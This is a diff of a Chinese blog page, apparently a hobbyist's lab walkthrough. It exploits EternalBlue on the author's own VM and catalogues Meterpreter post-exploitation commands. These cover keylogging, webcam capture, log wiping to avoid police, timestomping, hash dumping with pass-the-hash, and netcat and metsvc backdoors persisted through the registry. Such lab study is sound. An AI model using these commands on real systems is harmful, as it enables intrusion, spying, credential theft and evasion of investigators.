@@ -6,19 +6,64 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://yoursite.com">
-  <title>第一篇 | Today is the day</title>
+  <title>meterpreter命令 | Today is the day</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="##你好 这是我的第一篇，有点小激动 ##再见 一点也不激动了">
+  <meta name="description" content="title: meterpreter命令date: 2020-03-07 19:06:46tags:–Meterpreter是metasploit框架中的一个利器，一般都是作为漏洞利用载荷使用，当漏洞触发的时候，就会从目标系统上返回一个meterpreter shell的会话，可用于远程命令执行。 可以做的事情：信息收集、提权、注册表操作、令牌操纵、哈希利用、后门植入等等。 接下来的操作都是亲鉴">
 <meta property="og:type" content="article">
-<meta property="og:title" content="第一篇">
-<meta property="og:url" content="http://yoursite.com/2020/02/03/%E7%AC%AC%E4%B8%80%E7%AF%87/index.html">
+<meta property="og:title" content="meterpreter命令">
+<meta property="og:url" content="http://yoursite.com/2020/03/07/meterpreter%E5%91%BD%E4%BB%A4/index.html">
 <meta property="og:site_name" content="Today is the day">
-<meta property="og:description" content="##你好 这是我的第一篇，有点小激动 ##再见 一点也不激动了">
+<meta property="og:description" content="title: meterpreter命令date: 2020-03-07 19:06:46tags:–Meterpreter是metasploit框架中的一个利器，一般都是作为漏洞利用载荷使用，当漏洞触发的时候，就会从目标系统上返回一个meterpreter shell的会话，可用于远程命令执行。 可以做的事情：信息收集、提权、注册表操作、令牌操纵、哈希利用、后门植入等等。 接下来的操作都是亲鉴">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2020-02-03T11:26:07.000Z">
-<meta property="article:modified_time" content="2020-02-03T11:27:10.139Z">
+<meta property="og:image" content="https://github.com/Gabriele-S/Gabriele-S.github.io/blob/master/img/image001.png">
+<meta property="og:image" content="https://github.com/Gabriele-S/Gabriele-S.github.io/blob/master/img/image002.png">
+<meta property="og:image" content="https://github.com/Gabriele-S/Gabriele-S.github.io/blob/master/img/image003.png">
+<meta property="og:image" content="https://github.com/Gabriele-S/Gabriele-S.github.io/blob/master/img/image004.png">
+<meta property="og:image" content="https://github.com/Gabriele-S/Gabriele-S.github.io/blob/master/img/image005.png">
+<meta property="og:image" content="https://github.com/Gabriele-S/Gabriele-S.github.io/blob/master/img/image006.png">
+<meta property="og:image" content="https://github.com/Gabriele-S/Gabriele-S.github.io/blob/master/img/image007.png">
+<meta property="og:image" content="https://github.com/Gabriele-S/Gabriele-S.github.io/blob/master/img/image008.png">
+<meta property="og:image" content="https://github.com/Gabriele-S/Gabriele-S.github.io/blob/master/img/image009.png">
+<meta property="og:image" content="https://github.com/Gabriele-S/Gabriele-S.github.io/blob/master/img/image0010.png">
+<meta property="og:image" content="https://github.com/Gabriele-S/Gabriele-S.github.io/blob/master/img/image0011.png">
+<meta property="og:image" content="https://github.com/Gabriele-S/Gabriele-S.github.io/blob/master/img/image0012.png">
+<meta property="og:image" content="https://github.com/Gabriele-S/Gabriele-S.github.io/blob/master/img/image0013.png">
+<meta property="og:image" content="https://github.com/Gabriele-S/Gabriele-S.github.io/blob/master/img/image0014.png">
+<meta property="og:image" content="https://github.com/Gabriele-S/Gabriele-S.github.io/blob/master/img/image0015.png">
+<meta property="og:image" content="https://github.com/Gabriele-S/Gabriele-S.github.io/blob/master/img/image0016.png">
+<meta property="og:image" content="https://github.com/Gabriele-S/Gabriele-S.github.io/blob/master/img/image0017.png">
+<meta property="og:image" content="https://github.com/Gabriele-S/Gabriele-S.github.io/blob/master/img/image0018.png">
+<meta property="og:image" content="https://github.com/Gabriele-S/Gabriele-S.github.io/blob/master/img/image0019.png">
+<meta property="og:image" content="https://github.com/Gabriele-S/Gabriele-S.github.io/blob/master/img/image0020.png">
+<meta property="og:image" content="https://github.com/Gabriele-S/Gabriele-S.github.io/blob/master/img/image0021.png">
+<meta property="og:image" content="https://github.com/Gabriele-S/Gabriele-S.github.io/blob/master/img/image0022.png">
+<meta property="og:image" content="https://github.com/Gabriele-S/Gabriele-S.github.io/blob/master/img/image0023.png">
+<meta property="og:image" content="https://github.com/Gabriele-S/Gabriele-S.github.io/blob/master/img/image0024.png">
+<meta property="og:image" content="https://github.com/Gabriele-S/Gabriele-S.github.io/blob/master/img/image0025.png">
+<meta property="og:image" content="https://github.com/Gabriele-S/Gabriele-S.github.io/blob/master/img/image0026.png">
+<meta property="og:image" content="https://github.com/Gabriele-S/Gabriele-S.github.io/blob/master/img/image0027.png">
+<meta property="og:image" content="https://github.com/Gabriele-S/Gabriele-S.github.io/blob/master/img/image0028.png">
+<meta property="og:image" content="https://github.com/Gabriele-S/Gabriele-S.github.io/blob/master/img/image0029.png">
+<meta property="og:image" content="https://github.com/Gabriele-S/Gabriele-S.github.io/blob/master/img/image0030.png">
+<meta property="og:image" content="https://github.com/Gabriele-S/Gabriele-S.github.io/blob/master/img/image0031.png">
+<meta property="og:image" content="https://github.com/Gabriele-S/Gabriele-S.github.io/blob/master/img/image0032.png">
+<meta property="og:image" content="https://github.com/Gabriele-S/Gabriele-S.github.io/blob/master/img/image0033.png">
+<meta property="og:image" content="https://github.com/Gabriele-S/Gabriele-S.github.io/blob/master/img/image0034.png">
+<meta property="og:image" content="https://github.com/Gabriele-S/Gabriele-S.github.io/blob/master/img/image0035.png">
+<meta property="og:image" content="https://github.com/Gabriele-S/Gabriele-S.github.io/blob/master/img/image0036.png">
+<meta property="og:image" content="https://github.com/Gabriele-S/Gabriele-S.github.io/blob/master/img/image0037.png">
+<meta property="og:image" content="https://github.com/Gabriele-S/Gabriele-S.github.io/blob/master/img/image0038.png">
+<meta property="og:image" content="https://github.com/Gabriele-S/Gabriele-S.github.io/blob/master/img/image0038.png">
+<meta property="og:image" content="https://github.com/Gabriele-S/Gabriele-S.github.io/blob/master/img/image0040.png">
+<meta property="og:image" content="https://github.com/Gabriele-S/Gabriele-S.github.io/blob/master/img/image0041.png">
+<meta property="og:image" content="https://github.com/Gabriele-S/Gabriele-S.github.io/blob/master/img/image0042.png">
+<meta property="og:image" content="https://github.com/Gabriele-S/Gabriele-S.github.io/blob/master/img/image0043.png">
+<meta property="og:image" content="https://github.com/Gabriele-S/Gabriele-S.github.io/blob/master/img/image0044.png">
+<meta property="article:published_time" content="2020-03-07T12:11:37.212Z">
+<meta property="article:modified_time" content="2020-03-07T12:11:37.212Z">
 <meta property="article:author" content="Gabriele">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://github.com/Gabriele-S/Gabriele-S.github.io/blob/master/img/image001.png">
   
     <link rel="alternative" href="/atom.xml" title="Today is the day" type="application/atom+xml">
   
@@ -158,30 +203,80 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-第一篇" class="article article-type-post " itemscope itemprop="blogPost">
+            <article id="post-meterpreter命令" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 class="article-title" itemprop="name">
-      第一篇
+      meterpreter命令
     </h1>
   
 
         
-        <a href="/2020/02/03/%E7%AC%AC%E4%B8%80%E7%AF%87/" class="archive-article-date">
-  	<time datetime="2020-02-03T11:26:07.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-02-03</time>
+        <a href="/2020/03/07/meterpreter%E5%91%BD%E4%BB%A4/" class="archive-article-date">
+  	<time datetime="2020-03-07T12:11:37.212Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-03-07</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>##你好</p>
-<p>这是我的第一篇，有点小激动</p>
-<p>##再见</p>
-<p>一点也不激动了</p>
+        <hr>
+<p>title: meterpreter命令<br>date: 2020-03-07 19:06:46<br>tags:<br>–<br>Meterpreter是metasploit框架中的一个利器，一般都是作为漏洞利用载荷使用，当漏洞触发的时候，就会从目标系统上返回一个meterpreter shell的会话，可用于远程命令执行。</p>
+<p>可以做的事情：信息收集、提权、注册表操作、令牌操纵、哈希利用、后门植入等等。</p>
+<p>接下来的操作都是亲鉴可用的嘿嘿嘿</p>
+<p>利用永恒之蓝ms17_010使用meterpreter相关载荷来获取会话，以便后续展现meterpreter的厉害</p>
+<p>进行ms17_010漏洞利用获取会话shell</p>
+<ol>
+<li><p>检查连通性<br><img src="https://github.com/Gabriele-S/Gabriele-S.github.io/blob/master/img/image001.png" alt="image"></p>
+</li>
+<li><p>用nmap -sV ip扫描靶机开放的服务以及详细信息<br><img src="https://github.com/Gabriele-S/Gabriele-S.github.io/blob/master/img/image002.png" alt="image"></p>
+</li>
+</ol>
+<ol start="3">
+<li>启动msf并搜索利用相关模块<br><img src="https://github.com/Gabriele-S/Gabriele-S.github.io/blob/master/img/image003.png" alt="image"></li>
+</ol>
+<ol start="4">
+<li>Show options查看要配置的信息并配置上<br><img src="https://github.com/Gabriele-S/Gabriele-S.github.io/blob/master/img/image004.png" alt="image"></li>
+</ol>
+<ol start="5">
+<li>使用use windows/x64/meterpreter/reverse_tcp命令来使用该载荷<br><img src="https://github.com/Gabriele-S/Gabriele-S.github.io/blob/master/img/image005.png" alt="image"></li>
+</ol>
+<ol start="6">
+<li>用run或exploit进行溢出<br><img src="https://github.com/Gabriele-S/Gabriele-S.github.io/blob/master/img/image006.png" alt="image"><br>得到一个会话</li>
+</ol>
+<p>接下来介绍meterpreter的一些命令<br>Backgroup //将会话放到后台<br><img src="https://github.com/Gabriele-S/Gabriele-S.github.io/blob/master/img/image007.png" alt="image"></p>
+<p>Sessions -i [id值] //不加id值查看当前的会话，加id值进入该会话<br><img src="https://github.com/Gabriele-S/Gabriele-S.github.io/blob/master/img/image008.png" alt="image"></p>
+<p>Run  //命令可以执行脚本模块，只输入run按tab可显示所有脚本<br><img src="https://github.com/Gabriele-S/Gabriele-S.github.io/blob/master/img/image009.png" alt="image"></p>
+<p>Getuid  //查看当前的权限<br>Getpid  //获取当前进程的pid<br><img src="https://github.com/Gabriele-S/Gabriele-S.github.io/blob/master/img/image0010.png" alt="image"></p>
+<p>Info  //查看已有模块信息<br>Sysinfo  //查看目标机系统信息<br><img src="https://github.com/Gabriele-S/Gabriele-S.github.io/blob/master/img/image0011.png" alt="image"></p>
+<p>Ps  //列出目标机器所有进程<br>Kill pid值 //关闭进程<br><img src="https://github.com/Gabriele-S/Gabriele-S.github.io/blob/master/img/image0012.png" alt="image"><br><img src="https://github.com/Gabriele-S/Gabriele-S.github.io/blob/master/img/image0013.png" alt="image"></p>
+<p>Reboot  //重启目标机器<br>Shutdown -s -t 0 //0秒后关闭目标机器<br>这个我就不演示了</p>
+<p>Shell  //获取目标机器的cmd shell<br><img src="https://github.com/Gabriele-S/Gabriele-S.github.io/blob/master/img/image0014.png" alt="image"><br>这之后我们可以创建用户并且将其赋予管理员权限<br><img src="https://github.com/Gabriele-S/Gabriele-S.github.io/blob/master/img/image0015.png" alt="image"><br><img src="https://github.com/Gabriele-S/Gabriele-S.github.io/blob/master/img/image0016.png" alt="image"></p>
+<p>Uictl disable(禁止)/enable(开启) keyboard/mouse/all //禁止或开启键盘鼠标<br><img src="https://github.com/Gabriele-S/Gabriele-S.github.io/blob/master/img/image0017.png" alt="image"></p>
+<p>Webcam_list  //查看摄像头<br>Webcam_snap  //通过摄像头拍照<br>Webcam_stream  //通过摄像头开视频<br><img src="https://github.com/Gabriele-S/Gabriele-S.github.io/blob/master/img/image0018.png" alt="image"><br>由于这是我的靶机所以没有装摄像头，有兴趣可以自己试一下</p>
+<p>Execute  //在目标机器中执行文件<br><img src="https://github.com/Gabriele-S/Gabriele-S.github.io/blob/master/img/image0019.png" alt="image"><br>-H不可见 -i交互 -f指定要执行文件 详细看帮助-h</p>
+<p>Clearav  //清除日志信息，如果不想被查水表你就考虑一下用这个命令<br><img src="https://github.com/Gabriele-S/Gabriele-S.github.io/blob/master/img/image0020.png" alt="image"><br> 乱码问题可以在编码里调</p>
+<p>Pwd  //查看当前所在目录<br>Ls、cd等<br><img src="https://github.com/Gabriele-S/Gabriele-S.github.io/blob/master/img/image0021.png" alt="image"><br>Cat 文件名  //查看文件内容<br>Upload 要上传的文件 上传的位置  //往目标机器传文件<br>Download 要下载的文件 下载的位置  //从目标机器上下载文件<br><img src="https://github.com/Gabriele-S/Gabriele-S.github.io/blob/master/img/image0022.png" alt="image"><br><img src="https://github.com/Gabriele-S/Gabriele-S.github.io/blob/master/img/image0023.png" alt="image"></p>
+<p>Mkdir、rmdir、edit、rm都是Linux命令都可以使用，不再演示</p>
+<p>Timestomp  //伪造时间戳<br><img src="https://github.com/Gabriele-S/Gabriele-S.github.io/blob/master/img/image0024.png" alt="image"><br>-v查看时间戳 -f将某文件时间戳赋值给某文件  详细帮助-h查看</p>
+<p>Ipconfig/ifconfig、route(路由)、arp、netstat这些Windows基本命令不再演示</p>
+<p>Portfwd add -l端口号 -p 3389 -r本地ip  //端口转发将目标机器的3389端口发送到本地某端口<br><img src="https://github.com/Gabriele-S/Gabriele-S.github.io/blob/master/img/image0025.png" alt="image"><br> 然后在进行桌面连接本地66454端口即可</p>
+<p>Run autoroute  //添加路由<br> -s添加路由 -p查看路由 -h查看帮助<br><img src="https://github.com/Gabriele-S/Gabriele-S.github.io/blob/master/img/image0026.png" alt="image"></p>
+<p>还有很多信息收集脚本，记不太清了从网上找了一些<br>run post/windows/gather/checkvm #是否虚拟机<br>run post/linux/gather/checkvm #是否虚拟机<br>run post/windows/gather/forensics/enum_drives #查看分区<br>run post/windows/gather/enum_applications #获取安装软件信息<br>run post/windows/gather/dumplinks   #获取最近的文件操作<br>run post/windows/gather/enum_ie  #获取IE缓存<br>run post/windows/gather/enum_chrome   #获取Chrome缓存<br>run post/windows/gather/enum_patches  #补丁信息<br>run post/windows/gather/enum_domain  #查找域控<br><img src="https://github.com/Gabriele-S/Gabriele-S.github.io/blob/master/img/image0027.png" alt="image"><br>总之就是运行看结果就okkk</p>
+<p>提权：<br>Getsystem<br><img src="https://github.com/Gabriele-S/Gabriele-S.github.io/blob/master/img/image0028.png" alt="image"></p>
+<p>还可以利用bypassuac脚本</p>
+<p>再次执行getsystem命令<br><img src="https://github.com/Gabriele-S/Gabriele-S.github.io/blob/master/img/image0029.png" alt="image"></p>
+<p>内核漏洞提权<br>利用上面的信息收集脚本查看补丁信息，进行对应的提权<br><img src="https://github.com/Gabriele-S/Gabriele-S.github.io/blob/master/img/image0030.png" alt="image"><br>我这里已经是最高权限<br><img src="https://github.com/Gabriele-S/Gabriele-S.github.io/blob/master/img/image0031.png" alt="image"></p>
+<p>Screenshot  //截取目标及其的屏幕截图<br><img src="https://github.com/Gabriele-S/Gabriele-S.github.io/blob/master/img/image0032.png" alt="image"><br>Vnc  //使用vnc远程桌面连接<br><img src="https://github.com/Gabriele-S/Gabriele-S.github.io/blob/master/img/image0033.png" alt="image"></p>
+<p>Run getgui -e  //开启远程桌面<br><img src="https://github.com/Gabriele-S/Gabriele-S.github.io/blob/master/img/image0034.png" alt="image"></p>
+<p>键盘记录：<br>Keyscan_start  //开启键盘记录<br>Keyscan_dump  //列出记录<br>Keyscan_stop  //停止键盘记录<br><img src="https://github.com/Gabriele-S/Gabriele-S.github.io/blob/master/img/image0035.png" alt="image"></p>
+<p>Sniffer抓包：<br>Use sniffer<br>Sniffer_interfaces  //查看目标机器网卡信息<br><img src="https://github.com/Gabriele-S/Gabriele-S.github.io/blob/master/img/image0036.png" alt="image"></p>
+<p>上传nc后门：<br>在/usr/share/windows-binaries/目录下有个nc.exe文件<br>Upload上传，然后修改注册表让其监听到443端口<br>reg setval -k HKLM\software\microsoft\windows\currentversion\run -v lltest_nc -d ‘C:\windows\system32\nc.exe -Ldp 443 -e cmd.exe’ #设置键值<br>reg queryval -k HKLM\software\microsoft\windows\currentversion\Run -v lltest_nc   #查看键值<br>去网上找了设置键值跟查看的方法<br><img src="https://github.com/Gabriele-S/Gabriele-S.github.io/blob/master/img/image0037.png" alt="image"><br><img src="https://github.com/Gabriele-S/Gabriele-S.github.io/blob/master/img/image0038.png" alt="image"></p>
+<p>Hashdump  //从sam文件中导出哈密密码<br>Run post/windows/gather/stmart_hashdump  //利用脚本获取哈希<br><img src="https://github.com/Gabriele-S/Gabriele-S.github.io/blob/master/img/image0038.png" alt="image"><br>窃取哈希之后可以使用psexec模块进行哈希传递攻击<br><img src="https://github.com/Gabriele-S/Gabriele-S.github.io/blob/master/img/image0040.png" alt="image"><br><img src="https://github.com/Gabriele-S/Gabriele-S.github.io/blob/master/img/image0041.png" alt="image"><br><img src="https://github.com/Gabriele-S/Gabriele-S.github.io/blob/master/img/image0042.png" alt="image"></p>
+<p>Metsvc服务后门<br>Run metsvc -A  //自动安装后门<br><img src="https://github.com/Gabriele-S/Gabriele-S.github.io/blob/master/img/image0043.png" alt="image"><br>上传了三个文件，通过名字为meterpreter的的服务启动<br>利用后门<br>使用exploit/multi/handler 跟 windows/metsvc_bind_tcp载荷连接后门<br><img src="https://github.com/Gabriele-S/Gabriele-S.github.io/blob/master/img/image0044.png" alt="image"></p>
 
       
 
@@ -261,7 +356,7 @@
     <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//pan.baidu.com/share/qrcode?url=http://yoursite.com/2020/02/03/%E7%AC%AC%E4%B8%80%E7%AF%87/" alt="微信分享二维码">
+      <img src="//pan.baidu.com/share/qrcode?url=http://yoursite.com/2020/03/07/meterpreter%E5%91%BD%E4%BB%A4/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -275,18 +370,9 @@
   
 <nav id="article-nav">
   
-    <a href="/2020/03/07/meterpreter%E5%91%BD%E4%BB%A4/" id="article-nav-newer" class="article-nav-link-wrap">
-      <i class="icon-circle-left"></i>
-      <div class="article-nav-title">
-        
-          meterpreter命令
-        
-      </div>
-    </a>
   
-  
-    <a href="/2020/02/03/hello-world/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">Hello World</div>
+    <a href="/2020/02/03/%E7%AC%AC%E4%B8%80%E7%AF%87/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">第一篇</div>
       <i class="icon-circle-right"></i>
     </a>
   
